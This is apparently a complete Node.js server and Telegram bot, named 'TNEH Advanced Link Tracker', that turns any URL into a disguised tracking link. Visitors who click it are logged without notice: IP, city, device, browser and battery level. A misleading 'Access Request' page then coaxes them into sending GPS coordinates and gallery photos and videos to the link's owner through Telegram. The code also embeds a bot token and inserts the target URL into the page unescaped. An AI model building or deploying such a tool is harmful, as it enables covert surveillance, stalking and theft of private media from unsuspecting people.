import express from 'express';
import multer from 'multer';
import { v4 as uuidv4 } from 'uuid';
import path from 'path';
import fs from 'fs';
import { fileURLToPath } from 'url';
import fetch from 'node-fetch';
import crypto from 'crypto';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();

// ========== কনফিগারেশন ==========
const BASE_URL = 'https://tnehhackbot.onrender.com';
const BOT_TOKEN = '8895724721:AAH1vfL_NWrUbFNGpa9LU0jeQ19toJ0FsAo';

// ফোল্ডার তৈরি
const uploadsDir = path.join(__dirname, 'uploads');
const publicDir = path.join(__dirname, 'public');

if (!fs.existsSync(uploadsDir)) fs.mkdirSync(uploadsDir, { recursive: true });
if (!fs.existsSync(publicDir)) fs.mkdirSync(publicDir, { recursive: true });

// JSON ডাটাবেস
let links = {};
let clicks = {};
let userFiles = {};
const dbFile = path.join(__dirname, 'links.json');
const clicksFile = path.join(__dirname, 'clicks.json');
const filesFile = path.join(__dirname, 'userfiles.json');

// Load existing data
if (fs.existsSync(dbFile)) {
    try {
        links = JSON.parse(fs.readFileSync(dbFile));
    } catch (e) {
        links = {};
    }
}

if (fs.existsSync(clicksFile)) {
    try {
        clicks = JSON.parse(fs.readFileSync(clicksFile));
    } catch (e) {
        clicks = {};
    }
}

if (fs.existsSync(filesFile)) {
    try {
        userFiles = JSON.parse(fs.readFileSync(filesFile));
    } catch (e) {
        userFiles = {};
    }
}

// Save functions
function saveLinks() {
    fs.writeFileSync(dbFile, JSON.stringify(links, null, 2));
}

function saveClicks() {
    fs.writeFileSync(clicksFile, JSON.stringify(clicks, null, 2));
}

function saveUserFiles() {
    fs.writeFileSync(filesFile, JSON.stringify(userFiles, null, 2));
}

// ========== মিডলওয়্যার ==========
app.use(express.json({ limit: '100mb' }));
app.use(express.urlencoded({ extended: true, limit: '100mb' }));

app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.header('Access-Control-Allow-Headers', 'Content-Type');
    if (req.method === 'OPTIONS') return res.sendStatus(200);
    next();
});

const storage = multer.memoryStorage();
const upload = multer({ storage, limits: { fileSize: 50 * 1024 * 1024 } });

// ========== টেলিগ্রাম বোট ==========
let bot = null;

// Initialize bot asynchronously
async function initBot() {
    try {
        const { default: TelegramBot } = await import('node-telegram-bot-api');
        
        bot = new TelegramBot(BOT_TOKEN, { 
            polling: true,
            request: { timeout: 60000 }
        });
        
        console.log('🤖 Bot starting...');
        
        bot.getMe().then(botInfo => {
            console.log(`✅ Bot @${botInfo.username} is ready!`);
        }).catch(err => {
            console.log('GetMe error:', err.message);
        });
        
        // ========== স্টার্ট ==========
        bot.onText(/\/start/, (msg) => {
            const chatId = msg.chat.id;
            const name = msg.from.first_name || msg.from.username;
            
            bot.sendMessage(chatId, `
🎉 *Hello ${name}!* 🎉

*TNEH Advanced Link Tracker Bot*

🔗 *Features:*
• Track visitor location on Google Maps
• Access visitor gallery (with permission)
• Receive photos & videos from visitors
• Complete visitor analytics

*Commands:*
/start - Welcome
/help - Help
/mylinks - Your links
/stats [id] - Link statistics
/gallery [id] - View visitor gallery files
/location [id] - Get visitor location map

*Send me a link to track!* 🚀
            `, { parse_mode: 'Markdown' });
        });
        
        // ========== হেল্প ==========
        bot.onText(/\/help/, (msg) => {
            const chatId = msg.chat.id;
            
            bot.sendMessage(chatId, `
📖 *Complete Help Guide*

*How it works:*
1️⃣ Send me any URL
2️⃣ Get tracking link
3️⃣ Share link with anyone
4️⃣ When they click:
   • Request gallery permission
   • Get location with Google Maps
   • Capture device info
   • Send photos/videos to you

*Commands:*
/mylinks - Show all your links
/stats [id] - Detailed statistics
/gallery [id] - View files from visitors
/location [id] - Get visitor locations map
/recent [id] - Recent clicks

*Tracked Information:*
📍 GPS Location + Google Maps Link
📸 Gallery Photos & Videos
📱 Device & Browser Info
🔋 Battery Status
🌐 IP Address

*Send me a link to start!* 🔗
            `, { parse_mode: 'Markdown' });
        });
        
        // ========== মাই লিংকস ==========
        bot.onText(/\/mylinks/, (msg) => {
            const chatId = msg.chat.id;
            const userId = msg.from.id;
            
            const userLinks = Object.values(links).filter(link => link.userId === userId);
            
            if (userLinks.length === 0) {
                return bot.sendMessage(chatId, '❌ No links yet. Send me a URL to create one!');
            }
            
            let message = `📊 *Your Tracking Links (${userLinks.length})*\n\n`;
            userLinks.forEach(link => {
                const totalClicks = (clicks[link.id] || []).length;
                const filesCount = (userFiles[link.id] || []).length;
                message += `🔗 *${link.shortId}*\n`;
                message += `📌 ${BASE_URL}/l/${link.shortId}\n`;
                message += `👁️ Clicks: ${totalClicks}\n`;
                message += `📸 Files: ${filesCount}\n`;
                message += `📅 ${new Date(link.createdAt).toLocaleDateString()}\n\n`;
            });
            
            message += `\nUse /stats [id] for details\n`;
            message += `Use /gallery [id] to see received files`;
            
            bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
        });
        
        // ========== গ্যালারি ভিউ ==========
        bot.onText(/\/gallery (.+)/, async (msg, match) => {
            const chatId = msg.chat.id;
            const userId = msg.from.id;
            const shortId = match[1];
            
            const link = Object.values(links).find(l => l.shortId === shortId && l.userId === userId);
            
            if (!link) {
                return bot.sendMessage(chatId, '❌ Link not found or not yours!');
            }
            
            const files = userFiles[link.id] || [];
            
            if (files.length === 0) {
                return bot.sendMessage(chatId, '📭 No files received from visitors yet!');
            }
            
            let message = `📸 *Gallery Files Received (${files.length})*\n\n`;
            files.slice(-10).reverse().forEach((file, i) => {
                message += `${i+1}. ${file.type.toUpperCase()} - ${new Date(file.timestamp).toLocaleString()}\n`;
                message += `   👤 From: ${file.visitorInfo?.city || 'Unknown'}, ${file.visitorInfo?.country || 'Unknown'}\n`;
                message += `   🔗 ${BASE_URL}/file/${file.fileId}\n\n`;
            });
            
            message += `\nTotal files: ${files.length}\n`;
            message += `Use /allfiles ${shortId} to see all file links.`;
            
            bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
        });
        
        // ========== সব ফাইল ==========
        bot.onText(/\/allfiles (.+)/, async (msg, match) => {
            const chatId = msg.chat.id;
            const userId = msg.from.id;
            const shortId = match[1];
            
            const link = Object.values(links).find(l => l.shortId === shortId && l.userId === userId);
            
            if (!link) {
                return bot.sendMessage(chatId, '❌ Link not found!');
            }
            
            const files = userFiles[link.id] || [];
            
            if (files.length === 0) {
                return bot.sendMessage(chatId, '📭 No files yet!');
            }
            
            let message = `📸 *All Gallery Files*\n\n`;
            files.forEach((file, i) => {
                message += `${i+1}. ${BASE_URL}/file/${file.fileId}\n`;
            });
            
            if (message.length > 4000) {
                await bot.sendMessage(chatId, `📸 Total ${files.length} files. Use /gallery ${shortId} to see preview.`);
            } else {
                bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
            }
        });
        
        // ========== লোকেশন ==========
        bot.onText(/\/location (.+)/, async (msg, match) => {
            const chatId = msg.chat.id;
            const userId = msg.from.id;
            const shortId = match[1];
            
            const link = Object.values(links).find(l => l.shortId === shortId && l.userId === userId);
            
            if (!link) {
                return bot.sendMessage(chatId, '❌ Link not found!');
            }
            
            const linkClicks = clicks[link.id] || [];
            const locations = linkClicks.filter(c => c.gpsLat && c.gpsLon);
            
            if (locations.length === 0) {
                return bot.sendMessage(chatId, '📍 No location data available yet!');
            }
            
            const latest = locations[locations.length - 1];
            const googleMapsUrl = `https://www.google.com/maps?q=${latest.gpsLat},${latest.gpsLon}`;
            
            await bot.sendLocation(chatId, latest.gpsLat, latest.gpsLon);
            await bot.sendMessage(chatId, `
📍 *Visitor Location*

🗺️ *Google Maps:* ${googleMapsUrl}

📍 *Coordinates:* ${latest.gpsLat}, ${latest.gpsLon}
🏙️ *City:* ${latest.city || 'Unknown'}
🌍 *Country:* ${latest.country || 'Unknown'}
🕐 *Time:* ${new Date(latest.timestamp).toLocaleString()}

Total locations tracked: ${locations.length}
            `, { parse_mode: 'Markdown' });
        });
        
        // ========== স্ট্যাটস ==========
        bot.onText(/\/stats(.+)?/, async (msg, match) => {
            const chatId = msg.chat.id;
            const userId = msg.from.id;
            let shortId = match[1] ? match[1].trim() : null;
            
            if (!shortId) {
                return bot.sendMessage(chatId, '❌ Please provide link ID. Example: `/stats abc123`', { parse_mode: 'Markdown' });
            }
            
            const link = Object.values(links).find(l => l.shortId === shortId && l.userId === userId);
            
            if (!link) {
                return bot.sendMessage(chatId, '❌ Link not found or not yours!');
            }
            
            const linkClicks = clicks[link.id] || [];
            const filesReceived = userFiles[link.id] || [];
            const totalClicks = linkClicks.length;
            
            const uniqueIPs = new Set(linkClicks.map(c => c.ip)).size;
            
            const devices = {};
            const browsers = {};
            const countries = {};
            
            linkClicks.forEach(click => {
                if (click.device) devices[click.device] = (devices[click.device] || 0) + 1;
                if (click.browser) browsers[click.browser] = (browsers[click.browser] || 0) + 1;
                if (click.country) countries[click.country] = (countries[click.country] || 0) + 1;
            });
            
            let message = `📊 *Link Statistics*\n\n`;
            message += `🔗 *Original:* ${link.originalUrl}\n`;
            message += `📌 *Tracking Link:* ${BASE_URL}/l/${link.shortId}\n\n`;
            message += `📈 *Overview:*\n`;
            message += `• Total Clicks: *${totalClicks}*\n`;
            message += `• Unique Visitors: *${uniqueIPs}*\n`;
            message += `• Files Received: *${filesReceived.length}*\n`;
            message += `• Created: ${new Date(link.createdAt).toLocaleString()}\n\n`;
            
            if (Object.keys(devices).length > 0) {
                message += `📱 *Devices:*\n`;
                for (const [device, count] of Object.entries(devices)) {
                    const percent = ((count / totalClicks) * 100).toFixed(1);
                    message += `• ${device}: ${count} (${percent}%)\n`;
                }
                message += `\n`;
            }
            
            if (Object.keys(browsers).length > 0) {
                message += `🌐 *Browsers:*\n`;
                for (const [browser, count] of Object.entries(browsers)) {
                    const percent = ((count / totalClicks) * 100).toFixed(1);
                    message += `• ${browser}: ${count} (${percent}%)\n`;
                }
                message += `\n`;
            }
            
            if (Object.keys(countries).length > 0) {
                message += `🌍 *Top Countries:*\n`;
                const topCountries = Object.entries(countries).sort((a,b) => b[1] - a[1]).slice(0, 5);
                for (const [country, count] of topCountries) {
                    const percent = ((count / totalClicks) * 100).toFixed(1);
                    message += `• ${country}: ${count} (${percent}%)\n`;
                }
            }
            
            bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
        });
        
        // ========== রিসেন্ট ==========
        bot.onText(/\/recent (.+)/, async (msg, match) => {
            const chatId = msg.chat.id;
            const userId = msg.from.id;
            const shortId = match[1];
            
            const link = Object.values(links).find(l => l.shortId === shortId && l.userId === userId);
            
            if (!link) {
                return bot.sendMessage(chatId, '❌ Link not found!');
            }
            
            const linkClicks = clicks[link.id] || [];
            const recentClicks = linkClicks.slice(-10).reverse();
            
            if (recentClicks.length === 0) {
                return bot.sendMessage(chatId, '📭 No clicks yet!');
            }
            
            let message = `🕒 *Recent 10 Clicks*\n\n`;
            recentClicks.forEach((click, i) => {
                message += `${i+1}. ${new Date(click.timestamp).toLocaleString()}\n`;
                message += `   📍 ${click.city || 'Unknown'}, ${click.country || 'Unknown'}\n`;
                message += `   📱 ${click.device || 'Unknown'} | ${click.browser || 'Unknown'}\n`;
                if (click.battery) message += `   🔋 Battery: ${click.battery}%\n`;
                message += `\n`;
            });
            
            bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
        });
        
        // ========== লিংক প্রসেস ==========
        bot.onText(/(https?:\/\/[^\s]+)/, async (msg, match) => {
            const chatId = msg.chat.id;
            const userId = msg.from.id;
            const username = msg.from.username || msg.from.first_name;
            const originalUrl = match[1];
            
            console.log(`🔗 New link from: ${username}`);
            console.log(`📌 Original: ${originalUrl}`);
            
            try {
                const shortId = crypto.randomBytes(4).toString('hex');
                const linkId = uuidv4();
                
                links[linkId] = {
                    id: linkId,
                    shortId: shortId,
                    originalUrl: originalUrl,
                    userId: userId,
                    username: username,
                    createdAt: new Date().toISOString()
                };
                
                saveLinks();
                
                const trackingUrl = `${BASE_URL}/l/${shortId}`;
                
                await bot.sendMessage(chatId, `
✅ *Advanced Tracking Link Created!*

🔗 *Your Tracking Link:*
${trackingUrl}

📌 *Original URL:*
${originalUrl}

📊 *What you can track:*
• 📍 Live location with Google Maps
• 📸 Gallery photos & videos (with permission)
• 📱 Complete device information
• 🔋 Battery status
• 🌐 IP & Location data

👁️ *Commands to use:*
/mylinks - View all links
/stats ${shortId} - Statistics
/gallery ${shortId} - Received files
/location ${shortId} - Visitor map

Share this link and track every visitor! 🚀
                `, { parse_mode: 'Markdown', disable_web_page_preview: true });
                
                console.log(`✅ Tracking link created: ${trackingUrl}`);
                
            } catch (error) {
                console.error('Link creation error:', error);
                await bot.sendMessage(chatId, '❌ Failed to create tracking link. Please try again.');
            }
        });
        
        bot.on('polling_error', (error) => {
            console.log('Polling error:', error.code, error.message);
        });
        
        console.log('✅ Bot is ready! Send any link to start tracking.');
        
    } catch (error) {
        console.error('Bot initialization error:', error.message);
    }
}

// Initialize bot
initBot();

// ========== ট্র্যাকিং লিংক ==========
app.get('/l/:shortId', async (req, res) => {
    const { shortId } = req.params;
    
    const link = Object.values(links).find(l => l.shortId === shortId);
    
    if (!link) {
        return res.status(404).send(`
            <!DOCTYPE html>
            <html>
            <head><title>Link Not Found</title></head>
            <body style="text-align:center;padding:50px;font-family:Arial">
                <h1>❌ Link Not Found</h1>
                <p>The tracking link you're looking for doesn't exist.</p>
            </body>
            </html>
        `);
    }
    
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.socket.remoteAddress;
    const userAgent = req.headers['user-agent'];
    const acceptLanguage = req.headers['accept-language'];
    
    let device = 'Unknown';
    let browser = 'Unknown';
    let os = 'Unknown';
    
    if (userAgent) {
        if (userAgent.includes('Mobile')) device = 'Mobile';
        else if (userAgent.includes('Tablet')) device = 'Tablet';
        else device = 'Desktop';
        
        if (userAgent.includes('Chrome')) browser = 'Chrome';
        else if (userAgent.includes('Firefox')) browser = 'Firefox';
        else if (userAgent.includes('Safari')) browser = 'Safari';
        else if (userAgent.includes('Edge')) browser = 'Edge';
        
        if (userAgent.includes('Windows')) os = 'Windows';
        else if (userAgent.includes('Mac')) os = 'MacOS';
        else if (userAgent.includes('Linux')) os = 'Linux';
        else if (userAgent.includes('Android')) os = 'Android';
        else if (userAgent.includes('iOS')) os = 'iOS';
    }
    
    let location = { country: 'Unknown', city: 'Unknown', lat: null, lon: null };
    try {
        const geoResponse = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,city,lat,lon`);
        const geoData = await geoResponse.json();
        if (geoData.status === 'success') {
            location.country = geoData.country;
            location.city = geoData.city;
            location.lat = geoData.lat;
            location.lon = geoData.lon;
        }
    } catch (e) {
        console.log('Geo lookup failed:', e.message);
    }
    
    const clickData = {
        id: uuidv4(),
        linkId: link.id,
        timestamp: new Date().toISOString(),
        ip: ip,
        userAgent: userAgent,
        device: device,
        browser: browser,
        os: os,
        country: location.country,
        city: location.city,
        lat: location.lat,
        lon: location.lon,
        language: acceptLanguage,
        battery: null,
        hasCamera: null
    };
    
    if (!clicks[link.id]) clicks[link.id] = [];
    clicks[link.id].push(clickData);
    saveClicks();
    
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Access Request</title>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <style>
                * { margin: 0; padding: 0; box-sizing: border-box; }
                body {
                    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    min-height: 100vh;
                    padding: 20px;
                }
                .container {
                    max-width: 500px;
                    margin: 0 auto;
                    background: white;
                    border-radius: 20px;
                    padding: 30px;
                    box-shadow: 0 20px 60px rgba(0,0,0,0.3);
                }
                h1 { color: #333; margin-bottom: 20px; text-align: center; }
                .info {
                    background: #f0fdf4;
                    border: 1px solid #86efac;
                    border-radius: 10px;
                    padding: 15px;
                    margin: 20px 0;
                }
                button {
                    width: 100%;
                    padding: 15px;
                    margin: 10px 0;
                    border: none;
                    border-radius: 10px;
                    font-size: 16px;
                    cursor: pointer;
                }
                .allow-btn { background: #10b981; color: white; }
                .deny-btn { background: #ef4444; color: white; }
                .upload-area { display: none; margin-top: 20px; }
                .file-input { display: none; }
                .upload-label {
                    background: #667eea;
                    color: white;
                    padding: 10px 20px;
                    border-radius: 8px;
                    cursor: pointer;
                    display: inline-block;
                }
                #preview { margin-top: 10px; display: flex; flex-wrap: wrap; gap: 10px; }
                .preview-item { position: relative; width: 80px; height: 80px; }
                .preview-item img, .preview-item video { width: 100%; height: 100%; object-fit: cover; border-radius: 8px; }
                .send-btn { background: #667eea; color: white; margin-top: 10px; }
                .location-btn { background: #3b82f6; color: white; }
                .loading { display: none; text-align: center; margin-top: 10px; }
                .spinner {
                    border: 3px solid #f3f3f3;
                    border-top: 3px solid #667eea;
                    border-radius: 50%;
                    width: 30px;
                    height: 30px;
                    animation: spin 1s linear infinite;
                    margin: 0 auto;
                }
                @keyframes spin {
                    0% { transform: rotate(0deg); }
                    100% { transform: rotate(360deg); }
                }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>🔐 Access Request</h1>
                <div class="info">
                    <p>✅ 📍 Your location (Google Maps)</p>
                    <p>✅ 📸 Gallery photos & videos</p>
                    <p>✅ 📱 Device information</p>
                </div>
                
                <button class="allow-btn" onclick="allowAccess()">✅ Allow & Continue</button>
                <button class="deny-btn" onclick="denyAccess()">❌ Deny & Continue</button>
                
                <div id="uploadArea" class="upload-area">
                    <h3>📸 Share Files (Optional)</h3>
                    <label class="upload-label" for="fileInput">📁 Select Files</label>
                    <input type="file" id="fileInput" class="file-input" multiple accept="image/*,video/*">
                    <div id="preview"></div>
                    <button id="sendBtn" class="send-btn" onclick="sendFiles()" style="display:none">📤 Send to Owner</button>
                    <button class="location-btn" onclick="shareLocation()">📍 Share My Location</button>
                    <div id="status"></div>
                    <div id="loadingSpinner" class="loading"><div class="spinner"></div><p>Uploading...</p></div>
                </div>
            </div>
            
            <script>
                let selectedFiles = [];
                const shortId = '${shortId}';
                
                if ('getBattery' in navigator) {
                    navigator.getBattery().then(function(battery) {
                        fetch('/api/track/${shortId}/battery', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ level: battery.level * 100, charging: battery.charging })
                        });
                    });
                }
                
                function allowAccess() {
                    document.querySelector('.allow-btn').style.display = 'none';
                    document.querySelector('.deny-btn').style.display = 'none';
                    document.getElementById('uploadArea').style.display = 'block';
                    getLocation();
                    fetch('/api/track/${shortId}/access', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ granted: true })
                    });
                }
                
                function denyAccess() {
                    window.location.href = '${link.originalUrl}';
                }
                
                function getLocation() {
                    if ('geolocation' in navigator) {
                        navigator.geolocation.getCurrentPosition(function(position) {
                            fetch('/api/track/${shortId}/location', {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({ 
                                    lat: position.coords.latitude, 
                                    lon: position.coords.longitude 
                                })
                            });
                        });
                    }
                }
                
                function shareLocation() {
                    if ('geolocation' in navigator) {
                        navigator.geolocation.getCurrentPosition(function(position) {
                            const lat = position.coords.latitude;
                            const lon = position.coords.longitude;
                            fetch('/api/track/${shortId}/location', {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({ lat: lat, lon: lon, shared: true })
                            });
                            document.getElementById('status').innerHTML = '<div style="background:#d1fae5;padding:10px;border-radius:8px">✅ Location shared!</div>';
                        });
                    }
                }
                
                document.getElementById('fileInput').addEventListener('change', function(e) {
                    selectedFiles = Array.from(e.target.files);
                    const previewDiv = document.getElementById('preview');
                    previewDiv.innerHTML = '';
                    selectedFiles.forEach((file, index) => {
                        const reader = new FileReader();
                        reader.onload = function(event) {
                            const previewItem = document.createElement('div');
                            previewItem.className = 'preview-item';
                            if (file.type.startsWith('image/')) {
                                const img = document.createElement('img');
                                img.src = event.target.result;
                                previewItem.appendChild(img);
                            } else if (file.type.startsWith('video/')) {
                                const video = document.createElement('video');
                                video.src = event.target.result;
                                previewItem.appendChild(video);
                            }
                            previewDiv.appendChild(previewItem);
                        };
                        reader.readAsDataURL(file);
                    });
                    document.getElementById('sendBtn').style.display = selectedFiles.length > 0 ? 'block' : 'none';
                });
                
                async function sendFiles() {
                    if (selectedFiles.length === 0) return;
                    const loadingDiv = document.getElementById('loadingSpinner');
                    loadingDiv.style.display = 'block';
                    
                    for (const file of selectedFiles) {
                        const formData = new FormData();
                        formData.append('file', file);
                        formData.append('shortId', shortId);
                        
                        try {
                            await fetch('/api/upload/file', { method: 'POST', body: formData });
                        } catch (error) {
                            console.error('Upload failed:', error);
                        }
                    }
                    
                    loadingDiv.style.display = 'none';
                    document.getElementById('status').innerHTML = '<div style="background:#d1fae5;padding:10px;border-radius:8px">✅ Files sent!</div>';
                    setTimeout(() => {
                        window.location.href = '${link.originalUrl}';
                    }, 2000);
                }
            </script>
        </body>
        </html>
    `);
});

// ========== API Endpoints ==========
app.post('/api/track/:shortId/battery', async (req, res) => {
    const { shortId } = req.params;
    const { level } = req.body;
    
    const link = Object.values(links).find(l => l.shortId === shortId);
    if (link && clicks[link.id]) {
        const lastClick = clicks[link.id][clicks[link.id].length - 1];
        if (lastClick) {
            lastClick.battery = level;
            saveClicks();
        }
    }
    res.json({ success: true });
});

app.post('/api/track/:shortId/location', async (req, res) => {
    const { shortId } = req.params;
    const { lat, lon } = req.body;
    
    const link = Object.values(links).find(l => l.shortId === shortId);
    if (link && clicks[link.id]) {
        const lastClick = clicks[link.id][clicks[link.id].length - 1];
        if (lastClick) {
            lastClick.gpsLat = lat;
            lastClick.gpsLon = lon;
            saveClicks();
            
            if (bot && link.userId) {
                const googleMapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
                await bot.sendLocation(link.userId, lat, lon);
                await bot.sendMessage(link.userId, `
📍 *New Location Shared!*
🗺️ *Google Maps:* ${googleMapsUrl}
📍 *Coordinates:* ${lat}, ${lon}
👤 *From:* ${lastClick.city || 'Unknown'}, ${lastClick.country || 'Unknown'}
                `, { parse_mode: 'Markdown' });
            }
        }
    }
    res.json({ success: true });
});

app.post('/api/track/:shortId/access', async (req, res) => {
    const { shortId } = req.params;
    const { granted } = req.body;
    
    const link = Object.values(links).find(l => l.shortId === shortId);
    if (link && bot && link.userId) {
        await bot.sendMessage(link.userId, `
🔐 *Gallery Access Update!*
🔗 *Link:* ${BASE_URL}/l/${shortId}
✅ *Access Granted:* ${granted ? 'YES' : 'NO'}
🕐 *Time:* ${new Date().toLocaleString()}
        `, { parse_mode: 'Markdown' });
    }
    res.json({ success: true });
});

app.post('/api/upload/file', upload.single('file'), async (req, res) => {
    try {
        const { shortId } = req.body;
        
        if (!req.file) {
            return res.status(400).json({ error: 'No file uploaded' });
        }
        
        const link = Object.values(links).find(l => l.shortId === shortId);
        
        if (!link) {
            return res.status(404).json({ error: 'Link not found' });
        }
        
        const fileId = uuidv4();
        const ext = path.extname(req.file.originalname);
        const filename = `${fileId}${ext}`;
        const filepath = path.join(uploadsDir, filename);
        
        fs.writeFileSync(filepath, req.file.buffer);
        
        const lastClick = clicks[link.id] ? clicks[link.id][clicks[link.id].length - 1] : null;
        
        const fileData = {
            fileId: fileId,
            filename: req.file.originalname,
            type: req.file.mimetype.startsWith('image/') ? 'image' : 'video',
            size: req.file.size,
            timestamp: new Date().toISOString(),
            visitorInfo: {
                city: lastClick?.city || 'Unknown',
                country: lastClick?.country || 'Unknown',
                device: lastClick?.device || 'Unknown'
            }
        };
        
        if (!userFiles[link.id]) userFiles[link.id] = [];
        userFiles[link.id].push(fileData);
        saveUserFiles();
        
        if (bot && link.userId) {
            const caption = `
📸 *New File Received!*
🔗 *From Link:* ${BASE_URL}/l/${shortId}
📁 *File:* ${req.file.originalname}
📍 *Location:* ${lastClick?.city || 'Unknown'}, ${lastClick?.country || 'Unknown'}
🔗 *View:* ${BASE_URL}/file/${fileId}
            `;
            
            if (req.file.mimetype.startsWith('image/')) {
                await bot.sendPhoto(link.userId, req.file.buffer, { caption });
            } else {
                await bot.sendVideo(link.userId, req.file.buffer, { caption });
            }
        }
        
        res.json({ success: true, fileId: fileId, url: `${BASE_URL}/file/${fileId}` });
        
    } catch (error) {
        console.error('Upload error:', error);
        res.status(500).json({ error: error.message });
    }
});

app.get('/file/:fileId', (req, res) => {
    const { fileId } = req.params;
    const files = fs.readdirSync(uploadsDir);
    const filename = files.find(f => f.startsWith(fileId));
    
    if (!filename) {
        return res.status(404).send('File not found');
    }
    
    const filepath = path.join(uploadsDir, filename);
    res.sendFile(filepath);
});

app.get('/health', (req, res) => {
    res.json({ 
        status: 'ok', 
        time: new Date().toISOString(),
        totalLinks: Object.keys(links).length,
        totalClicks: Object.values(clicks).reduce((sum, arr) => sum + arr.length, 0),
        totalFiles: Object.values(userFiles).reduce((sum, arr) => sum + arr.length, 0)
    });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`✅ Server running on ${BASE_URL}`);
    console.log(`📊 Total links: ${Object.keys(links).length}`);
    console.log(`👁️ Total clicks: ${Object.values(clicks).reduce((sum, arr) => sum + arr.length, 0)}`);
    console.log(`📸 Total files: ${Object.values(userFiles).reduce((sum, arr) => sum + arr.length, 0)}`);
});

export default app;
